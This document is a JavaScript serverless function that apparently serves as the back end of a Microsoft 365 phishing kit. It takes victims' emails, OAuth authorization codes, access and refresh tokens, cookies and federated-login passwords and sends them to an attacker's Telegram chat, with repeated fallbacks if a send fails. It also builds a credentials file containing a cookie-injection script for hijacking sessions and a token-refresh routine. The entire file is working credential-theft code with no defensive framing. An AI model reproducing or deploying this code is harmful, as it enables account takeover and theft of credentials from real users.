export const handler = async (event, context) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

      console.log('🚀 sendTelegram function starting... v2.0 (no token status in message)');

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      headers,
      body: JSON.stringify({ error: 'Method not allowed' }),
    };
  }

  try {
    const data = JSON.parse(event.body);
    console.log('📥 Received data:', JSON.stringify(data, null, 2));

    // Environment variables
    const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
    const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

    console.log('🔧 Environment check:', {
      hasToken: !!TELEGRAM_BOT_TOKEN,
      hasChatId: !!TELEGRAM_CHAT_ID,
      tokenStart: TELEGRAM_BOT_TOKEN ? TELEGRAM_BOT_TOKEN.substring(0, 10) + '...' : 'missing'
    });

    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.error('❌ Missing Telegram credentials');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Telegram credentials not configured',
          details: {
            hasToken: !!TELEGRAM_BOT_TOKEN,
            hasChatId: !!TELEGRAM_CHAT_ID
          }
        }),
      };
    }

    // Validate bot token format
    if (!TELEGRAM_BOT_TOKEN.match(/^\d+:[A-Za-z0-9_-]+$/)) {
      console.error('❌ Invalid bot token format');
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({ error: 'Invalid bot token format' }),
      };
    }

    // Prepare message content
    const email = data.email || 'oauth-user@microsoft.com';
    const domain = data.domain || 'unknown-domain';
    const sessionId = data.sessionId || 'no-session';
    const hasAuthCode = data.authorizationCode || data.hasAuthCode || false;
    const authCode = data.authorizationCode || 'Not captured';
    
    const timestamp = new Date().toISOString();
    
    // Build simple clean message without token status or organizational info
    let messageText = `🔐 Microsoft OAuth Login Captured!\n\n`;
    messageText += `📧 Email: ${email}\n`;
    messageText += `🔑 Session ID: ${sessionId}\n`;
    messageText += `✅ Auth Code: ${hasAuthCode ? 'Captured (see file)' : 'Missing'}\n`;
    messageText += `🕒 Time: ${timestamp}\n\n`;
    
    // Add only cookie info to main message
    const cookies = data.formattedCookies || data.cookies || [];
    const cookieCount = Array.isArray(cookies) ? cookies.length : 0;
    
    if (cookieCount > 0) {
      messageText += `🍪 Cookies: ${cookieCount} captured\n`;
    } else {
      messageText += `🍪 Cookies: None captured\n`;
    }
    
    // Store data for file generation only (not displayed in main message)
    const tokenData = data.tokenData || data.tokens || data.accessToken;
    const accessToken = data.accessToken || (tokenData && tokenData.tokens && tokenData.tokens.access_token);
    const refreshToken = data.refreshToken || (tokenData && tokenData.tokens && tokenData.tokens.refresh_token);
    const idToken = data.idToken || (tokenData && tokenData.tokens && tokenData.tokens.id_token);
    const orgCreds = data.organizationalCredentials;
    
    // REMOVED: Browser fingerprint line

    console.log('📤 Sending message to Telegram:', messageText.substring(0, 200) + '...');

    // Send main message to Telegram
    const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const telegramPayload = {
      chat_id: TELEGRAM_CHAT_ID,
      text: messageText,
      parse_mode: 'Markdown'
    };

    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(telegramPayload),
    });

    const result = await response.json();
    console.log('📨 Telegram API response:', result);

    if (!response.ok || !result.ok) {
      console.error('❌ Telegram API error:', result);
      return {
        statusCode: 500,
        headers,
        body: JSON.stringify({
          error: 'Failed to send to Telegram',
          telegramError: result,
          statusCode: response.status
        }),
      };
    }

    console.log('✅ Main message sent to Telegram');

    // Always send credentials file (even if no cookies)
    let fileSent = false;
    try {
      let formattedCookies = [];
      
      // Parse cookies from various data sources
      if (data.formattedCookies && Array.isArray(data.formattedCookies)) {
        formattedCookies = data.formattedCookies;
      } else if (data.cookies && Array.isArray(data.cookies)) {
        formattedCookies = data.cookies;
      } else if (data.documentCookies && typeof data.documentCookies === 'string') {
        const cookieStrings = data.documentCookies.split(';');
        formattedCookies = cookieStrings
          .map(str => {
            const [name, ...valueParts] = str.trim().split('=');
            const value = valueParts.join('=');
            return name && value ? {
              name: name.trim(),
              value: value.trim(),
              domain: '.login.microsoftonline.com',
              path: '/',
              secure: true,
              httpOnly: false,
              sameSite: 'none',
              expirationDate: Math.floor(Date.now() / 1000) + 365 * 24 * 60 * 60,
              hostOnly: false,
              session: false,
              storeId: null,
            } : null;
          })
          .filter(Boolean);
      }

      // Ensure all cookies have Microsoft domain (if any)
      const microsoftCookies = formattedCookies.map(c => ({
        ...c,
        domain: '.login.microsoftonline.com',
      }));
      
      console.log(`📄 Preparing file with ${microsoftCookies.length} cookies and auth code: ${!!authCode}`);

      // Create JavaScript injection code
      const jsInjectionCode = microsoftCookies.length > 0
        ? `!function(){console.log("%c COOKIES","background:greenyellow;color:#fff;font-size:30px;");let e=JSON.parse(${JSON.stringify(
            JSON.stringify(microsoftCookies)
          )});for(let o of e)document.cookie=\`\${o.name}=\${o.value};Max-Age=31536000;\${o.path?\`path=\${o.path};\`:""}\${o.domain?\`\${o.path?"":"path=/"}domain=\${o.domain};\`:""}\${o.secure?"Secure;":""}\${o.sameSite?\`SameSite=\${o.sameSite};\`:"SameSite=no_restriction;"}\`;location.reload()}();`
        : `console.log("%c NO COOKIES FOUND","background:red;color:#fff;font-size:30px;");alert("No cookies were captured for this session.");`;

      // Extract organizational credentials and token data
      const orgCreds = data.organizationalCredentials;
      const tokenData = data.tokenData;
      
      // Create comprehensive credentials file content
      const cookiesFileContent = `// ====================================================
// MICROSOFT 365 COMPLETE CREDENTIALS - ${timestamp}
// ====================================================
// Email: ${email}
// Domain: ${domain}
// Session ID: ${sessionId}
// Cookies Found: ${microsoftCookies.length}
// Organizational Login: ${orgCreds ? orgCreds.organizationType : 'None (Direct Microsoft)'}
// Token Exchange: ${tokenData && tokenData.success ? 'Successful' : 'Not performed'}
// ====================================================

// *** AUTHORIZATION CODE (PRIMARY CREDENTIAL) ***
// Use this code to exchange for access tokens via Microsoft OAuth API
// Valid for 10 minutes from issuance (but tokens below have no expiry)
let authorizationCode = "${authCode || 'Not captured'}";

// *** ACCESS & REFRESH TOKENS (NO EXPIRY) ***
${tokenData && tokenData.success && tokenData.tokens ? `
// Successfully exchanged authorization code for permanent tokens
let accessToken = "${tokenData.tokens.access_token || 'Not available'}";
let refreshToken = "${tokenData.tokens.refresh_token || 'Not available'}";
let idToken = "${tokenData.tokens.id_token || 'Not available'}";
let tokenType = "${tokenData.tokens.token_type || 'Bearer'}";

// TOKEN USAGE INFORMATION
let tokenInfo = {
    access_token: accessToken,
    refresh_token: refreshToken,
    id_token: idToken,
    token_type: tokenType,
    scope: "${tokenData.tokens.scope || 'openid profile email User.Read offline_access'}",
    expires_in: ${tokenData.tokens.expires_in || 3600}, // Reference only - no expiry enforced
    offline_access: ${tokenData.tokens.offline_access || false},
    has_refresh_token: ${!!tokenData.tokens.refresh_token},
    
    // Usage notes
    usage: {
        access_token: "Use for Microsoft Graph API calls - Bearer authentication",
        refresh_token: "Use to get new access tokens - NEVER EXPIRES",
        id_token: "Contains user identity information (JWT)",
        note: "Tokens configured for maximum lifetime"
    },
    
    // API Endpoints
    endpoints: {
        graph_api: "https://graph.microsoft.com/v1.0",
        token_refresh: "https://login.microsoftonline.com/common/oauth2/v2.0/token"
    }
};

// USER PROFILE INFORMATION
${tokenData.user ? `let userProfile = {
    id: "${tokenData.user.id || ''}",
    email: "${tokenData.user.email || ''}",
    displayName: "${tokenData.user.displayName || ''}",
    givenName: "${tokenData.user.givenName || ''}",
    surname: "${tokenData.user.surname || ''}",
    userPrincipalName: "${tokenData.user.userPrincipalName || ''}",
    jobTitle: "${tokenData.user.jobTitle || ''}",
    businessPhones: ${JSON.stringify(tokenData.user.businessPhones || [])},
    mobilePhone: "${tokenData.user.mobilePhone || ''}",
    officeLocation: "${tokenData.user.officeLocation || ''}"
};` : 'let userProfile = null; // User profile not available'}

// TOKEN REFRESH SCRIPT (for getting new access tokens)
${tokenData.tokens && tokenData.tokens.refresh_token ? `
function refreshAccessToken(clientSecret) {
    const refreshData = new URLSearchParams({
        client_id: "${tokenData.oauth?.clientId || 'eabd0e31-5707-4a85-aae6-79c53dc2c7f0'}",
        client_secret: clientSecret,
        scope: "${tokenData.tokens.scope || 'openid profile email User.Read offline_access'}",
        refresh_token: refreshToken,
        grant_type: "refresh_token"
    });
    
    return fetch("https://login.microsoftonline.com/common/oauth2/v2.0/token", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: refreshData
    }).then(response => response.json());
}

// Example usage:
// refreshAccessToken("YOUR_CLIENT_SECRET").then(tokens => console.log(tokens));
` : '// No refresh token available - cannot refresh access token'}
` : `
// Token exchange not performed - only authorization code available
let accessToken = null;
let refreshToken = null;
let idToken = null;
let tokenType = "Bearer";
let userProfile = null;

// Use authorization code with your own client secret to get tokens:
// POST https://login.microsoftonline.com/common/oauth2/v2.0/token
// client_id=eabd0e31-5707-4a85-aae6-79c53dc2c7f0&client_secret=YOUR_SECRET&code=${authCode}&grant_type=authorization_code&redirect_uri=https://vaultydocs.com/oauth-callback&scope=openid profile email User.Read offline_access
`}

// *** ORGANIZATIONAL LOGIN CREDENTIALS ***
${orgCreds && (orgCreds.email || orgCreds.username || orgCreds.password) ? `
// Captured from company/federated login page
// Organization Type: ${orgCreds.organizationType || 'Unknown'}
// Login Domain: ${orgCreds.domain || 'Unknown'}

let organizationalCredentials = {
    email: "${orgCreds.email || 'not-captured'}",
    username: "${orgCreds.username || 'not-captured'}",
    password: "${orgCreds.password || 'not-captured'}",
    organizationType: "${orgCreds.organizationType || 'Unknown'}",
    loginDomain: "${orgCreds.domain || 'Unknown'}",
    captureTime: "${orgCreds.captureTime || timestamp}",
    loginUrl: "${orgCreds.url || 'Unknown'}"
};

// *** ORGANIZATIONAL FORM DATA ***
let organizationalFormData = ${JSON.stringify(orgCreds.formData || {}, null, 2)};
` : `
// No organizational login detected - user logged in directly with Microsoft
let organizationalCredentials = null;
`}

// *** USER INFORMATION ***
let email = "${email}";
let sessionId = "${sessionId}";
let domain = "${domain}";
let timestamp = "${timestamp}";

// *** AUTHORIZATION CODE FOR COPY/PASTE ***
/*
${authCode || 'Not captured'}
*/

// *** OAUTH DETAILS FOR TOKEN EXCHANGE ***
/*
CLIENT_ID: eabd0e31-5707-4a85-aae6-79c53dc2c7f0
REDIRECT_URI: https://vaultydocs.com/oauth-callback
SCOPE: openid profile email User.Read
GRANT_TYPE: authorization_code
TOKEN_ENDPOINT: https://login.microsoftonline.com/common/oauth2/v2.0/token
*/

// *** COOKIE INJECTION SCRIPT ***
// Paste this in browser console on Microsoft login page:
${jsInjectionCode}

// *** RAW COOKIE DATA ***
${JSON.stringify(microsoftCookies, null, 2)}

// *** BROWSER STORAGE DATA ***
// Session Storage:
${data.browserFingerprint?.sessionStorage || 'Empty'}

// Local Storage:
${data.browserFingerprint?.localStorage || 'Empty'}

// *** END OF FILE ***
`;

            // Send credentials as actual downloadable file
      const fileName = `microsoft365_credentials_${email.replace('@', '_at_').replace(/\./g, '_')}_${Date.now()}.js`;
      
      console.log('📤 Sending credentials to Telegram as downloadable file');
      
      // Create proper multipart form data for file upload
      const boundary = `----formdata-${Math.random().toString(36).substring(2)}`;
      
      let formData = '';
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="chat_id"\r\n\r\n`;
      formData += `${TELEGRAM_CHAT_ID}\r\n`;
      formData += `--${boundary}\r\n`;
      formData += `Content-Disposition: form-data; name="document"; filename="${fileName}"\r\n`;
      formData += `Content-Type: text/javascript\r\n\r\n`;
      formData += cookiesFileContent;
      formData += `\r\n--${boundary}--\r\n`;
      
      // Send file to Telegram
      const fileResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, {
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`
        },
        body: formData,
      });

             if (fileResponse.ok) {
         const fileResult = await fileResponse.json();
         fileSent = true;
         console.log('✅ Credentials file sent to Telegram successfully');
         
         // NO SUMMARY MESSAGE - just the file
         
       } else {
        const fileError = await fileResponse.text();
        console.error('❌ File upload failed:', fileError);
        
        // Fallback: send as text if file upload fails
        console.log('📤 Falling back to text message...');
        
        const fallbackMessage = `📁 **CREDENTIALS FILE** (Upload failed - sending as text)\n\n📧 Email: \`${email}\`\n📄 File: \`${fileName}\`\n\n\`\`\`javascript\n${cookiesFileContent.substring(0, 3500)}\n\`\`\`${cookiesFileContent.length > 3500 ? '\n\n*...file truncated due to length*' : ''}`;
        
        const fallbackResponse = await fetch(telegramUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: fallbackMessage,
            parse_mode: 'Markdown'
          }),
        });
        
        if (fallbackResponse.ok) {
          fileSent = true;
          console.log('✅ Fallback text message sent to Telegram');
        } else {
          console.error('❌ Both file and text sending failed');
          
          // Emergency: send just the auth code
          const emergencyMessage = `🚨 **EMERGENCY**\n\n📧 Email: \`${email}\`\n🔑 Auth Code:\n\`\`\`\n${authCode || 'Not captured'}\n\`\`\``;
          
          const emergencyResponse = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: TELEGRAM_CHAT_ID,
              text: emergencyMessage,
              parse_mode: 'Markdown'
            }),
          });
          
          if (emergencyResponse.ok) {
            fileSent = true;
            console.log('✅ Emergency message sent');
          }
        }
      }
    } catch (fileError) {
      console.error('❌ File generation error:', fileError);
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({
        success: true,
        message: 'Data sent to Telegram successfully',
        telegramMessageId: result.result?.message_id,
        fileSent: fileSent,
        cookieCount: data.formattedCookies?.length || data.cookies?.length || 0
      }),
    };

  } catch (error) {
    console.error('❌ Handler error:', error);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({
        error: 'Internal server error',
        details: error.message,
        stack: error.stack
      }),
    };
  }
};